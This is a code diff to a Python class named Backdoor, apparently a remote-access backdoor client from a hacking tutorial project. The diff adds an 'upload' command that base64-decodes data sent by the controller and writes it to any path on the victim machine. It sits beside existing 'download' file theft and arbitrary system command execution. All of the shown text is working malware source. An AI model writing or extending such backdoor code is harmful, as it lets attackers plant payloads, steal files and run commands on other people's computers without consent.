@@ -39,6 +39,11 @@ class Backdoor:
         os.chdir(path)
         return "[+] Changing working directory to " + path
 
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Upload successful. "
+
     def read_file(self, path):
         with open(path, "rb") as file:
             return base64.b64encode(file.read())
@@ -55,6 +60,8 @@ class Backdoor:
                 command_result = self.change_working_directory_to(command[1])
             elif command[0] == "download":
                 command_result = self.read_file(command[1])
+            elif command[0] == "upload":
+                command_result = self.write_file(command[1], command[2])
             else:
                 # pass this command variable to a function named execute_system_command
                 command_result = self.execute_system_command(command)
